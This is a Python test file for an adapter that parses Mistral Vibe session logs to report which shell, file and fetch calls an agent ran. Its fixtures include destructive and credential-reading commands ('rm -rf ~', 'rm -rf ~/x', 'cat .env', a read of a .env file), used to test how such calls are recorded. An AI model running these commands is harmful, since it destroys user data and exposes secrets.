"""The Mistral Vibe adapter (ranwhat/sources/mistral_vibe.py).

Fixtures are built field for field from what Vibe 3.0.0 wrote in a real
`vibe -p` run against a mock model (its CURRENT, manifest, chunk and
journal files, with the working directory shortened) and from the v3.0.0
source: the projection ops of _storage.py, the effect entries of
_projection.py, the manual shell effect of _shell.py. The 2.x layout is
built from v2.26.1's session logger and LLMMessage. Digests are filled in
with real SHA-256 values where Vibe writes them, though the adapter does
not check them.

Everything runs in temp directories: the home directory and VIBE_HOME
point there, clean's backup root too, and the real home is never read.
Every secret is synthetic, and token-shaped ones are written as adjacent
literals.
"""
import contextlib
import hashlib
import io
import json
import os
import shutil
import stat
import sys
import tempfile
import time
import unittest
from unittest import mock

TESTS = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(TESTS)
sys.path.insert(0, REPO)
sys.path.insert(0, TESTS)

from ranwhat import clean, watch  # noqa: E402
from ranwhat.sources import _paths, _rewrite  # noqa: E402
from ranwhat.sources import mistral_vibe as mv  # noqa: E402
from ranwhat.sources.base import Location, ToolCall  # noqa: E402
from ranwhat.sources.mistral_vibe import MistralVibeSource  # noqa: E402

ENV = "VIBE_HOME"
WINDOWS = os.name == "nt"

SECRET = "sk_" "live_" "Zq8vR2mT6yLp4WcN0sXe7HbJ"

SID = "d483835d-6cdf-594b-6546-98884f0c5ba2"
CHILD = "0a1b2c3d-1111-4222-8333-444455556666"
CWD = "/home/dev/app"
BASE_MS = 1792476411000          # 2026-10-20T06:06:51Z, the real run's time
GEN = "0000000000000029"
SEQ = 29
FIRST = 30


# --------------------------------------------------------------------------
# Fixture builders: Vibe's records
# --------------------------------------------------------------------------

def canon(obj):
    """RFC 8785 for these values: sorted keys, no spaces."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False)


def sha(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return hashlib.sha256(data).hexdigest()


def message(n, role, text, ms=None):
    ms = BASE_MS + n * 100 if ms is None else ms
    return {"content": [{"text": text, "type": "text"}], "createdAt": ms,
            "generationStatus": "completed", "id": "user-turn-%d" % n,
            "inputEntryId": None, "relatedEntryId": None, "role": role,
            "sessionId": SID, "source": "turn_start", "turnId": "turn-1",
            "type": "message", "updatedAt": ms}


def effect(action, tool, arguments, output=None, status="completed", n=1,
           decision="execute", kind="tool", **state):
    """An effect entry as _projection.py builds it (_completed_effect_entry
    on top of _running_effect_entry), the shape of the real run's."""
    ms = BASE_MS + n * 100
    entry = {
        "createdAt": ms,
        "detail": {"display": {"message": tool, "settledMessage": tool,
                               "settledVerb": "Ran", "statusText":
                               "Running " + tool, "summary": tool,
                               "verb": "Running"},
                   "input": arguments, "kind": kind, "toolName": tool},
        "generationStatus": "completed" if status != "running"
        else "in_progress",
        "id": "effect-" + action,
        "inputEntryId": "user-turn-1", "relatedEntryId": None,
        "sessionId": SID, "title": tool, "turnId": "turn-1",
        "type": "effect", "updatedAt": ms + 33,
    }
    if status == "running":
        entry["state"] = {"outputText": "", "status": "running"}
        return entry
    st = {"display": {"message": tool, "success": status == "completed"},
          "outputText": "", "status": status}
    if decision:
        st.update(approvalSource="bypass", approvalType="always",
                  decision=decision)
    if output is not None:
        st["output"] = {"_meta": {"approval": {"approvalSource": "bypass",
                                               "approvalType": "always",
                                               "decision": "execute"}},
                        "content": [],
                        "structured_content": {
                            "command": (arguments or {}).get("command"),
                            "returncode": 0, "stderr": "", "stdout": output,
                            "was_truncated": False},
                        "type": "success"}
    st.update(state)
    entry["state"] = st
    return entry


def bash(action, command, output="", **kw):
    return effect(action, "file_system.bash", {"command": command},
                  output=output, **kw)


# The real run's entry, shortened: file_system.bash, "echo hello-from-vibe".
REAL = {
    "createdAt": 1792476411661,
    "detail": {"display": {"message": "file_system.bash",
                           "settledMessage": "file_system.bash",
                           "settledVerb": "Ran",
                           "statusText": "Running file_system.bash",
                           "summary": "file_system.bash", "verb": "Running"},
               "input": {"command": "echo hello-from-vibe && pwd"},
               "kind": "tool", "toolName": "file_system.bash"},
    "generationStatus": "completed",
    "id": "effect-67efb98b-ab9a-5bb9-b998-ecd3ec5db9ee",
    "inputEntryId": "user-turn-93fd7062134dfad9daf2fbafb6407acf-1",
    "relatedEntryId": None, "sessionId": SID,
    "state": {"approvalSource": "bypass", "approvalType": "always",
              "decision": "execute",
              "display": {"message": "file_system.bash", "success": True},
              "output": {"_meta": {"approval": {
                  "approvalSource": "bypass", "approvalType": "always",
                  "decision": "execute"}},
                  "content": [],
                  "structured_content": {
                      "command": "echo hello-from-vibe && pwd",
                      "returncode": 0, "stderr": "",
                      "stdout": "hello-from-vibe\n/home/dev/app\n",
                      "was_truncated": False},
                  "type": "success"},
              "outputText": "", "status": "completed"},
    "title": "file_system.bash",
    "turnId": "turn-93fd7062134dfad9daf2fbafb6407acf",
    "type": "effect", "updatedAt": 1792476411694,
}


def op_append(entry):
    return {"op": "append_entry", "entry": entry}


def op_replace(entry):
    return {"op": "replace_entry", "id": entry["id"], "entry": entry}


def op_remove(entry_id):
    return {"op": "remove_entry", "id": entry_id}


def op_set(entries):
    return {"op": "set_history_entries", "entries": entries}


ENVELOPE = {"op": "set_envelope", "state": {"format":
            "harness.public-session-state/v1", "history": {"entries": []}}}


def record(seq, rtype, payload, previous=None):
    """A journal line, in the canonical key order Vibe writes (type last)."""
    body = {"payload": payload, "previous_record_sha256": previous,
            "recovery_journal_record_version": 1, "sequence": seq,
            "type": rtype}
    digest = sha(canon(body))
    body["record_sha256"] = digest
    return canon(body)


def delta(seq, ops, watermark=1):
    return record(seq, "projection_delta", {"delta": ops,
                                            "watermark": watermark})


def action_intent(seq, size=200):
    """A record whose line is as long as the model's whole input."""
    return record(seq, "action_intent", {
        "action_id": "a%d" % seq, "kind": "tool_call", "lease_id": "l",
        "recovery_mode": "retry", "request": {"input": "x" * size},
        "request_sha256": sha("x")})


class Session(object):
    """A unified session folder written the way Vibe 3.0.0 lays it out."""

    def __init__(self, save, sid=SID, cwd=CWD, age=3600):
        self.root = os.path.join(save, "unified", sid)
        self.sid = sid
        self.cwd = cwd
        self.age = age

    def put(self, rel, data):
        path = os.path.join(self.root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        if not isinstance(data, bytes):
            data = (data if isinstance(data, str) else canon(data)) + "\n"
            data = data.encode("utf-8")
        with open(path, "wb") as fh:
            fh.write(data)
        when = time.time() - self.age
        os.utime(path, (when, when))
        return path

    def chunk(self, items):
        body = canon(items)
        digest = sha(body)
        self.put("chunks/%s.json" % digest, body)
        return digest

    def write(self, entries=(), journal=(), chunked=True, generation=GEN,
              seq=SEQ, minor=9, fmt=mv.STORE_FORMAT, journal_raw=None,
              meta=True):
        """CURRENT, one generation, its journal segment and meta.json."""
        entries = list(entries)
        digests = None
        if chunked:
            digests = [self.chunk(entries[i:i + 3])
                       for i in range(0, len(entries), 3)] if entries else []
        first = seq + 1
        jname = "%016d.jsonl" % first
        projection = {"projection_state_version": 1, "session_id": self.sid,
                      "snapshot": {"format": "harness.public-session-state/v1",
                                   "history": {"entries": [] if chunked
                                               else entries},
                                   "session": {"id": self.sid}},
                      "snapshot_sequence": seq, "watermark": 8}
        gdir = "generations/" + generation
        self.put(gdir + "/projection-state.json", projection)
        for name in ("checkpoint.json", "runtime-state.json"):
            self.put(gdir + "/" + name, {"session_id": self.sid,
                                         "messages": []})
        manifest = {
            "checkpoint": {"checkpoint_version": 1, "path": "checkpoint.json"},
            "created_at": "2026-10-20T06:07:44.172Z",
            "execution_state": "quiescent", "generation": generation,
            "interop_export": None, "manifest_version": 1,
            "projection_state": {"chunks": digests,
                                 "path": "projection-state.json"},
            "recovery_journal_segment": {"first_sequence": first,
                                         "path": "journal/" + jname},
            "runtime_state": {"chunks": None, "path": "runtime-state.json"},
            "session_id": self.sid, "snapshot_sequence": seq}
        self.put(gdir + "/manifest.json", manifest)
        self.put("CURRENT", {"generation": generation,
                             "manifest_sha256": sha(canon(manifest)),
                             "session_id": self.sid, "snapshot_sequence": seq,
                             "store_format": fmt,
                             "store_format_minor": minor})
        if journal_raw is not None:
            self.put("journal/" + jname, journal_raw)
        else:
            self.put("journal/" + jname, "".join(l + "\n" for l in journal)
                     .encode("utf-8"))
        if meta:
            self.put("meta.json", {
                "session_id": self.sid, "parent_session_id": None,
                "start_time": "2026-10-20T06:06:51.248000+00:00",
                "end_time": "2026-10-20T06:07:44.116000+00:00",
                "environment": {"working_directory": self.cwd},
                "origin_directory": self.cwd, "title": None,
                "import_provenance": None})
        return os.path.join(self.root, "CURRENT")


def legacy_call(cid, name, arguments):
    return {"id": cid, "index": 0, "type": "function",
            "function": {"name": name, "arguments":
                         arguments if isinstance(arguments, str)
                         else json.dumps(arguments)}}


def assistant_row(calls, text=""):
    return {"role": "assistant", "content": text, "tool_calls": calls,
            "message_id": "m-" + calls[0]["id"]}


def tool_row(cid, name, content):
    return {"role": "tool", "content": content, "name": name,
            "tool_call_id": cid}


def user_row(text):
    return {"role": "user", "content": text, "message_id": "u-" + text[:4]}


def manual_row(command, stdout="", stderr="", cwd=CWD, ms=BASE_MS):
    return {"role": "user", "content": "", "message_id": "u-shell",
            "manual_shell": {"operation_id": "op1", "command": command,
                             "cwd": cwd, "stdout": stdout, "stderr": stderr,
                             "output_text": stdout, "exit_code": 0,
                             "timed_out": False, "interrupted": False,
                             "duration_ms": 12.0, "created_at": ms}}


def _tempdir(case, prefix):
    path = tempfile.mkdtemp(prefix=prefix)
    case.addCleanup(shutil.rmtree, path, True)
    return path


def tree_state(root):
    """{relative path: (sha256, mtime_ns)} of every file under root."""
    out = {}
    for base, _dirs, names in os.walk(root):
        for name in names:
            path = os.path.join(base, name)
            with open(path, "rb") as fh:
                out[os.path.relpath(path, root)] = (
                    sha(fh.read()), os.stat(path).st_mtime_ns)
    return out


def _marker(value):
    return clean.REDACTION % clean._fingerprint(value)


# --------------------------------------------------------------------------
# Common setup
# --------------------------------------------------------------------------

class VibeCase(unittest.TestCase):

    def setUp(self):
        self.home = _tempdir(self, "vibe-home-")
        for p in (mock.patch.dict(os.environ, {"HOME": self.home,
                                               "USERPROFILE": self.home}),
                  mock.patch.object(_paths, "home", return_value=self.home)):
            p.start()
            self.addCleanup(p.stop)
        os.environ.pop(ENV, None)
        self.backups = os.path.join(_tempdir(self, "vibe-bk-"), "b")
        p = mock.patch.object(clean, "BACKUP_ROOT", self.backups)
        p.start()
        self.addCleanup(p.stop)
        self.vibe_home = os.path.join(self.home, ".vibe")
        self.save = os.path.join(self.vibe_home, "logs", "session")
        self.src = MistralVibeSource()

    def session(self, sid=SID, **kw):
        return Session(self.save, sid=sid, **kw)

    def stores(self, override=None, since_days=None):
        return self.src.stores(self.src.locations(override=override),
                               since_days=since_days)

    def store(self, path):
        for store in self.stores():
            if store.path == path:
                return store
        self.fail("%s is not a store" % path)

    def calls(self, path):
        return list(self.src.tool_calls(self.store(path)))

    def by_id(self, path):
        return dict((c.tool_call_id, c) for c in self.calls(path))

    def legacy(self, rows, name="session_20260920_101500_ab12cd34", age=3600,
               raw=None, meta=True, sid="ab12cd34-0000-4000-8000-000000000000"):
        folder = os.path.join(self.save, name)
        os.makedirs(folder, exist_ok=True)
        path = os.path.join(folder, "messages.jsonl")
        if raw is None:
            raw = "".join(json.dumps(r) + "\n" for r in rows).encode("utf-8")
        with open(path, "wb") as fh:
            fh.write(raw)
        when = time.time() - age
        os.utime(path, (when, when))
        if meta:
            mpath = os.path.join(folder, "meta.json")
            with open(mpath, "w", encoding="utf-8") as fh:
                json.dump({"session_id": sid,
                           "start_time": "2026-09-20T10:15:00+00:00",
                           "end_time": "2026-09-20T10:30:00+00:00",
                           "environment": {"working_directory": CWD},
                           "username": "dev"}, fh)
            os.utime(mpath, (when, when))
        return path


# --------------------------------------------------------------------------
# Where Vibe keeps its history
# --------------------------------------------------------------------------

class DefaultPaths(unittest.TestCase):

    def test_each_platform(self):
        p = MistralVibeSource()
        self.assertEqual(
            p.default_paths({}, "/Users/u", "darwin"),
            [("/Users/u/.vibe/logs/session", "default")])
        self.assertEqual(
            p.default_paths({}, "/home/u", "linux"),
            [("/home/u/.vibe/logs/session", "default")])
        self.assertEqual(
            p.default_paths({}, "C:\\Users\\u", "win32"),
            [("C:\\Users\\u\\.vibe\\logs\\session", "default")])

    def test_vibe_home_replaces_the_default_on_every_platform(self):
        p = MistralVibeSource()
        how = "env " + ENV
        self.assertEqual(
            p.default_paths({ENV: "/srv/vibe"}, "/home/u", "linux"),
            [("/srv/vibe/logs/session", how)])
        self.assertEqual(
            p.default_paths({ENV: "/srv/vibe"}, "/Users/u", "darwin"),
            [("/srv/vibe/logs/session", how)])
        self.assertEqual(
            p.default_paths({ENV: "D:\\vibe"}, "C:\\Users\\u", "win32"),
            [("D:\\vibe\\logs\\session", how)])

    def test_a_leading_tilde_is_the_home_directory(self):
        p = MistralVibeSource()
        how = "env " + ENV
        self.assertEqual(
            p.default_paths({ENV: "~/v"}, "/home/u", "linux"),
            [("/home/u/v/logs/session", how)])
        self.assertEqual(
            p.default_paths({ENV: "~"}, "/home/u", "linux"),
            [("/home/u/logs/session", how)])
        self.assertEqual(
            p.default_paths({ENV: "~\\v"}, "C:\\Users\\u", "win32"),
            [("C:\\Users\\u\\v\\logs\\session", how)])

    def test_an_empty_variable_is_not_set(self):
        self.assertEqual(
            MistralVibeSource().default_paths({ENV: ""}, "/home/u", "linux"),
            [("/home/u/.vibe/logs/session", "default")])

    def test_what_every_report_needs(self):
        p = MistralVibeSource()
        self.assertEqual((p.id, p.name, p.unit, p.env), (
            "mistral-vibe", "Mistral Vibe", "session", (ENV,)))
        self.assertIn("VIBE_HOME", p.path_means)
        self.assertEqual(p.checked, "3.0.0")
        for text in (p.path_means, p.mask_note, mv.WHY_SEALED):
            self.assertNotIn("\u2014", text)
        self.assertFalse(p.needs_projects)

    def test_the_path_keys_are_a_subset_of_watchs(self):
        for key in mv.PATH_KEYS:
            self.assertIn(key, watch._PATH_KEYS)


class Discovery(VibeCase):

    def test_a_missing_root_is_zero_stores(self):
        self.assertEqual(self.stores(), [])
        locs = self.src.locations()
        self.assertEqual([l.exists for l in locs], [False])

    def test_an_empty_save_folder_is_zero_stores(self):
        os.makedirs(os.path.join(self.save, "unified"))
        self.assertEqual(self.stores(), [])

    def test_the_variable_is_read_at_call_time(self):
        other = os.path.join(self.home, "elsewhere")
        Session(os.path.join(other, "logs", "session")).write([REAL])
        self.assertEqual(self.stores(), [])
        os.environ[ENV] = other
        self.addCleanup(os.environ.pop, ENV, None)
        stores = self.stores()
        self.assertEqual([s.session for s in stores], [SID])
        self.assertEqual(self.src.locations()[0].how, "env " + ENV)

    def test_a_missing_variable_falls_back_to_the_home_folder(self):
        self.session().write([REAL])
        os.environ.pop(ENV, None)
        locs = self.src.locations()
        self.assertEqual([l.path for l in locs], [self.save])
        self.assertEqual((locs[0].how, locs[0].found), ("default", 1))

    def test_path_may_name_the_save_folder_or_a_vibe_home(self):
        self.session().write([REAL])
        for given in (self.save, self.vibe_home):
            stores = self.stores(override=given)
            self.assertEqual([s.session for s in stores], [SID], given)

    def test_unified_and_legacy_sessions_are_both_found_newest_first(self):
        path = self.session(age=7200).write([REAL])
        old = self.legacy([user_row("hi")], age=100000)
        stores = self.stores()
        self.assertEqual([s.path for s in stores if s.role == "transcript"],
                         [path, old])
        self.assertEqual(
            sorted(s.path for s in stores if s.role == "side"),
            [os.path.join(os.path.dirname(old), "meta.json")])

    def test_what_is_not_a_session_is_not_a_store(self):
        self.session().write([REAL])
        for sub in ("active", "plugins", "unified/.hidden"):
            os.makedirs(os.path.join(self.save, *sub.split("/")), exist_ok=True)
        with open(os.path.join(self.save, "active", "x.lock"), "w", encoding="utf-8") as fh:
            fh.write("1")
        os.makedirs(os.path.join(self.save, "unified", "bad name!"))
        os.makedirs(os.path.join(self.save, "random-dir"))
        with open(os.path.join(self.save, "unified", ".session-index.json"),
                  "w", encoding="utf-8") as fh:
            fh.write("{}")
        stores = self.stores()
        self.assertEqual([x.role for x in stores if x.role == "transcript"],
                         ["transcript"])
        self.assertEqual([os.path.basename(x.path) for x in stores
                          if x.role == "side"], [".session-index.json"])

    def test_session_and_project_of_a_store(self):
        path = self.session().write([REAL])
        store = self.store(path)
        self.assertEqual((store.source, store.format, store.role, store.unit,
                          store.session, store.project),
                         ("mistral-vibe", "json", "transcript", "session",
                          SID, CWD))

    def test_a_store_without_meta_has_no_project(self):
        path = self.session().write([REAL], meta=False)
        self.assertIsNone(self.store(path).project)

    def test_a_unified_session_is_read_only_with_a_reason(self):
        store = self.store(self.session().write([REAL]))
        self.assertEqual(store.masking, "read-only")
        self.assertEqual(store.why_read_only, mv.WHY_SEALED)

    def test_the_session_is_as_new_as_its_journal(self):
        s = self.session(age=100000)
        path = s.write([REAL], journal=[delta(30, [op_append(REAL)])])
        recent = time.time() - 60
        os.utime(os.path.join(s.root, "journal", "%016d.jsonl" % FIRST),
                 (recent, recent))
        self.assertAlmostEqual(self.store(path).mtime, recent, delta=2)

    def test_days_prefilter_by_last_write(self):
        self.session(age=10 * 86400).write([REAL])
        self.session(sid=CHILD, age=3600).write([REAL])
        self.assertEqual(
            [s.session for s in self.stores(since_days=2)], [CHILD])
        self.assertEqual(len(self.stores(since_days=30)), 2)

    @unittest.skipIf(WINDOWS, "symlinks need privileges on Windows")
    def test_a_symlinked_session_is_not_followed(self):
        real = _tempdir(self, "vibe-real-")
        Session(real, sid=SID).write([REAL])
        os.makedirs(os.path.join(self.save, "unified"))
        os.symlink(os.path.join(real, "unified", SID),
                   os.path.join(self.save, "unified", SID))
        self.assertEqual(self.stores(), [])


# --------------------------------------------------------------------------
# The Unified store
# --------------------------------------------------------------------------

class UnifiedCalls(VibeCase):

    def test_the_real_run_s_entry(self):
        path = self.session().write([message(1, "user", "run a command"),
                                     REAL])
        got = self.calls(path)
        self.assertEqual(len(got), 1)
        call = got[0]
        self.assertEqual((call.source, call.store, call.session,
                          call.project, call.tool_name, call.tool_call_id,
                          call.kind, call.known, call.actor, call.status),
                         ("mistral-vibe", path, SID, CWD,
                          "file_system.bash",
                          "effect-67efb98b-ab9a-5bb9-b998-ecd3ec5db9ee",
                          "shell", True, "agent", None))
        self.assertEqual(call.command, "echo hello-from-vibe && pwd")
        self.assertEqual(call.consumed, frozenset(["command"]))
        self.assertEqual(call.tool_input,
                         {"command": "echo hello-from-vibe && pwd"})
        self.assertEqual(call.timestamp, "2026-10-20T06:06:51Z")
        self.assertIsNone(call.not_after)
        self.assertEqual(call.output, "hello-from-vibe\n/home/dev/app\n")

    def test_inline_history_is_read_like_pooled_history(self):
        entries = [message(1, "user", "go"), bash("a1", "ls"),
                   bash("a2", "pwd")]
        for chunked in (True, False):
            sid = CHILD if chunked else SID
            path = self.session(sid=sid).write(entries, chunked=chunked)
            self.assertEqual([c.command for c in self.calls(path)],
                             ["ls", "pwd"], chunked)

    def test_chunks_are_joined_in_the_order_the_manifest_lists_them(self):
        entries = [bash("a%d" % i, "echo %d" % i, n=i) for i in range(7)]
        path = self.session().write(entries)       # chunks of three
        self.assertEqual([c.command for c in self.calls(path)],
                         ["echo %d" % i for i in range(7)])

    def test_file_tools_and_their_paths(self):
        entries = [
            effect("r", "file_system.read_file", {"path": "/home/dev/.env"}),
            effect("w", "file_system.write_file",
                   {"path": "/home/dev/a.txt", "content": "x"}),
            effect("e", "file_system.search_replace",
                   {"file_path": "/home/dev/b.py", "content": [
                       {"old_str": "a", "new_str": "b"}]}),
            effect("g", "grep", {"pattern": "foo"}),
            effect("f", "web_fetch", {"url": "https://example.com"}),
            effect("p", "process.start", {"command": "npm run dev",
                                          "cwd": "/home/dev/app"}),
            effect("sk", "skill.read", {"name": "vibe"}),
            effect("ag", "agents.spawn", {"message": "m"}, kind="subagent"),
        ]
        got = self.by_id(self.session().write(entries))
        read = got["effect-r"]
        self.assertEqual((read.kind, read.known, read.paths, read.consumed),
                         ("read", True, ("/home/dev/.env",),
                          frozenset(["path"])))
        write = got["effect-w"]
        self.assertEqual((write.kind, write.paths, write.consumed),
                         ("write", ("/home/dev/a.txt",), frozenset()))
        edit = got["effect-e"]
        self.assertEqual((edit.kind, edit.paths), ("write",
                                                   ("/home/dev/b.py",)))
        self.assertEqual((got["effect-g"].kind, got["effect-g"].known),
                         ("other", True))
        self.assertEqual((got["effect-f"].kind, got["effect-f"].known),
                         ("fetch", True))
        proc = got["effect-p"]
        self.assertEqual((proc.kind, proc.command, proc.workdir),
                         ("shell", "npm run dev", "/home/dev/app"))
        self.assertEqual((got["effect-sk"].kind, got["effect-sk"].known),
                         ("other", True))
        self.assertEqual((got["effect-ag"].kind, got["effect-ag"].known),
                         ("other", True))

    def test_a_bare_2x_tool_name_is_known_in_a_unified_entry_too(self):
        got = self.by_id(self.session().write(
            [effect("b", "bash", {"command": "ls"})]))
        self.assertEqual((got["effect-b"].kind, got["effect-b"].command),
                         ("shell", "ls"))

    def test_mcp_and_unlisted_tools_are_unknown_and_judged_by_name(self):
        entries = [effect("m", "github.create_issue", {"title": "t"}),
                   effect("c", "vibe.cron", {"action": "create"}),
                   effect("w", "process.write", {"input": "rm -rf ~\n"})]
        got = self.by_id(self.session().write(entries))
        for key in ("effect-m", "effect-c", "effect-w"):
            self.assertEqual((got[key].kind, got[key].known),
                             ("other", False), key)
        self.assertEqual(got["effect-m"].tool_name, "github.create_issue")

    def test_a_command_the_user_ran_with_a_bang(self):
        shell = effect("s", "shell", {"command": "git status"},
                       output=None, kind="shell", decision=None)
        shell["state"] = {"display": {"message": "Ran git status",
                                      "success": True},
                          "output": {"output": "clean\n", "stderr": "",
                                     "stdout": "clean\n"},
                          "outputText": "clean\n", "status": "completed"}
        call = self.by_id(self.session().write([shell]))["effect-s"]
        self.assertEqual((call.actor, call.kind, call.command, call.output),
                         ("user", "shell", "git status", "clean\n"))

    def test_a_failed_bang_command_keeps_its_error_as_output(self):
        shell = effect("s", "shell", {"command": "false"}, kind="shell",
                       decision=None)
        shell["state"] = {"display": {"message": "Command exited with "
                                      "status 1", "success": False},
                          "error": {"message": "Command exited with status 1"},
                          "outputText": "", "status": "failed"}
        call = self.by_id(self.session().write([shell]))["effect-s"]
        self.assertEqual(call.output, "Command exited with status 1")
        self.assertIsNone(call.status)

    def test_a_call_vibe_skipped_is_declined(self):
        skipped = bash("k", "rm -rf ~/x", status="skipped", decision="skip")
        skipped["state"]["reason"] = "User rejected"
        by_decision = bash("d", "rm -rf ~/y", decision="skip")
        ran = bash("r", "ls", output="a\n")
        got = self.by_id(self.session().write([skipped, by_decision, ran]))
        self.assertEqual(got["effect-k"].status, "declined")
        self.assertEqual(got["effect-d"].status, "declined")
        self.assertIsNone(got["effect-r"].status)

    def test_a_cancelled_or_failed_call_is_still_a_call(self):
        failed = bash("f", "exit 3", status="failed")
        failed["state"]["error"] = {"code": "tool_failed", "message": "boom"}
        cancelled = bash("c", "sleep 99", status="cancelled")
        got = self.by_id(self.session().write([failed, cancelled]))
        self.assertIsNone(got["effect-f"].status)
        self.assertEqual(got["effect-f"].output, "boom")
        self.assertIsNone(got["effect-c"].status)

    def test_a_running_effect_in_the_projection_is_reported(self):
        running = bash("run", "make", status="running")
        got = self.by_id(self.session().write([running]))
        self.assertEqual(got["effect-run"].command, "make")
        self.assertIsNone(got["effect-run"].output)

    def test_the_worktree_record_is_no_call(self):
        wt = effect("wt", "worktree", {}, kind="worktree")
        self.assertEqual(self.calls(self.session().write([wt, bash("a", "ls")]))
                         [0].command, "ls")

    def test_output_comes_from_outputText_first_then_stdout_and_stderr(self):
        a = bash("a", "x", output="from stdout")
        a["state"]["outputText"] = "the text"
        b = bash("b", "y", output="out")
        b["state"]["output"]["structured_content"]["stderr"] = "err"
        c = effect("c", "mcp.tool", {}, status="completed")
        c["state"]["output"] = {"content": [{"type": "text", "text": "T1"},
                                            {"type": "image"},
                                            {"type": "text", "text": "T2"}]}
        got = self.by_id(self.session().write([a, b, c]))
        self.assertEqual(got["effect-a"].output, "the text")
        self.assertEqual(got["effect-b"].output, "out\nerr")
        self.assertEqual(got["effect-c"].output, "T1\nT2")

    def test_a_huge_output_is_cut(self):
        big = bash("big", "yes", output="y" * (mv.OUTPUT_MAX + 50))
        call = self.calls(self.session().write([big]))[0]
        self.assertEqual(len(call.output), mv.OUTPUT_MAX)

    def test_a_missing_timestamp_gets_a_bound(self):
        e = bash("a", "ls")
        del e["createdAt"]
        call = self.calls(self.session().write([e]))[0]
        self.assertIsNone(call.timestamp)
        self.assertIsNotNone(call.not_after)

    def test_a_shell_call_with_no_command_is_counted(self):
        e = effect("a", "file_system.bash", {})
        got = self.calls(self.session().write([e]))
        self.assertEqual(len(got), 1)
        self.assertIsNone(got[0].command)
        self.assertEqual(self.src.counts["unreadable_calls"], 1)

    def test_an_effect_with_no_detail_is_counted_and_still_reported(self):
        e = bash("a", "ls")
        del e["detail"]
        got = self.calls(self.session().write([e]))
        self.assertEqual([c.tool_name for c in got], ["file_system.bash"])
        self.assertEqual(self.src.counts["unreadable_calls"], 1)

    def test_counts_are_taken_once_however_often_a_store_is_read(self):
        e = effect("a", "file_system.bash", {})
        path = self.session().write([e])
        store = self.store(path)
        for _ in range(3):
            list(self.src.tool_calls(store))
            list(self.src.secret_texts(store))
        self.assertEqual(self.src.counts["unreadable_calls"], 1)

    def test_entries_without_an_id_or_of_other_types_are_skipped(self):
        junk = [bash("a", "ls"), {"type": "effect"}, "string", 7, None,
                {"type": "notice", "id": "n1"},
                {"type": "checkpoint", "id": "c1", "kind": "compaction"}]
        got = self.calls(self.session().write(junk, chunked=False))
        self.assertEqual([c.command for c in got], ["ls"])

    def test_an_empty_store(self):
        path = self.session().write([])
        self.assertEqual(self.calls(path), [])
        self.assertEqual(list(self.src.secret_texts(self.store(path)))[0]
                         .where, "meta.json")
        self.assertEqual(self.src.counts["unreadable_stores"], 0)


class UnifiedJournal(VibeCase):
    """What happened since the generation was published (a turn that is
    still running, or just ended)."""

    def test_a_call_that_exists_only_in_the_journal(self):
        journal = [delta(30, [op_append(message(2, "user", "go")), ENVELOPE]),
                   action_intent(31),
                   delta(32, [op_append(bash("mid", "cat .env",
                                             status="running")), ENVELOPE])]
        path = self.session().write([bash("old", "ls")], journal=journal)
        got = self.by_id(path)
        self.assertEqual(sorted(got), ["effect-mid", "effect-old"])
        self.assertEqual(got["effect-mid"].command, "cat .env")

    def test_replace_settles_a_running_call_in_place(self):
        running = bash("x", "make test", status="running")
        done = bash("x", "make test", output="ok\n")
        journal = [delta(30, [op_replace(done)])]
        path = self.session().write([bash("a", "ls"), running, bash("b", "pwd")],
                                    journal=journal)
        got = self.calls(path)
        self.assertEqual([c.command for c in got], ["ls", "make test", "pwd"])
        self.assertEqual(got[1].output, "ok\n")

    def test_remove_drops_an_entry(self):
        path = self.session().write(
            [bash("a", "ls"), bash("b", "pwd")],
            journal=[delta(30, [op_remove("effect-a")])])
        self.assertEqual([c.command for c in self.calls(path)], ["pwd"])

    def test_set_history_entries_replaces_everything(self):
        path = self.session().write(
            [bash("a", "ls")],
            journal=[delta(30, [op_set([bash("n1", "one"),
                                        bash("n2", "two")])])])
        self.assertEqual([c.command for c in self.calls(path)],
                         ["one", "two"])

    def test_projection_advanced_carries_a_whole_snapshot(self):
        snap = {"history": {"entries": [bash("s", "whoami")]}}
        path = self.session().write(
            [bash("a", "ls")],
            journal=[record(30, "projection_advanced",
                            {"snapshot": snap, "watermark": 9})])
        self.assertEqual([c.command for c in self.calls(path)], ["whoami"])

    def test_session_relocated_carries_a_delta(self):
        path = self.session().write(
            [], journal=[record(30, "session_relocated", {
                "delta": [op_append(bash("r", "pwd"))], "metadata": {},
                "plugin_lock": {}, "watermark": 3})])
        self.assertEqual([c.command for c in self.calls(path)], ["pwd"])

    def test_a_long_record_of_another_type_is_skipped_unparsed(self):
        journal = [action_intent(30, size=4000),
                   delta(31, [op_append(bash("a", "ls"))]),
                   action_intent(32, size=4000)]
        path = self.session().write([], journal=journal)
        with mock.patch.object(mv, "MAX_LINE", 1500):
            self.assertEqual([c.command for c in self.calls(path)], ["ls"])
        self.assertEqual(self.src.counts["unreadable_calls"], 0)
        self.assertEqual(self.src.counts["unparsed"], 0)

    def test_a_line_streamed_past_in_steps(self):
        journal = [action_intent(30, size=9000),
                   delta(31, [op_append(bash("a", "ls"))])]
        path = self.session().write([], journal=journal)
        with mock.patch.object(mv, "MAX_LINE", 1500), \
                mock.patch.object(mv, "_STEP", 64):
            self.assertEqual([c.command for c in self.calls(path)], ["ls"])

    def test_a_projection_record_too_long_to_read_is_counted(self):
        big = delta(30, [op_append(bash("a", "x" * 3000))])
        path = self.session().write([bash("keep", "ls")],
                                    journal=[big, delta(31, [op_append(
                                        bash("b", "pwd"))])])
        with mock.patch.object(mv, "MAX_LINE", 1500):
            got = self.calls(path)
        self.assertEqual([c.command for c in got], ["ls", "pwd"])
        self.assertEqual(self.src.counts["unreadable_calls"], 1)

    def test_a_torn_last_line_is_skipped_quietly(self):
        good = delta(30, [op_append(bash("a", "ls"))]) + "\n"
        torn = delta(31, [op_append(bash("b", "rm -rf ~/x"))])[:-40]
        path = self.session().write(
            [], journal_raw=(good + torn).encode("utf-8"))
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            self.assertEqual([c.command for c in self.calls(path)], ["ls"])
            list(self.src.secret_texts(self.store(path)))
        self.assertEqual(err.getvalue(), "")
        self.assertEqual(self.src.counts["unparsed"], 0)

    def test_a_whole_last_line_with_no_newline_is_a_record_being_written(self):
        good = delta(30, [op_append(bash("a", "ls"))]) + "\n"
        whole = delta(31, [op_append(bash("b", "pwd"))])
        path = self.session().write(
            [], journal_raw=(good + whole).encode("utf-8"))
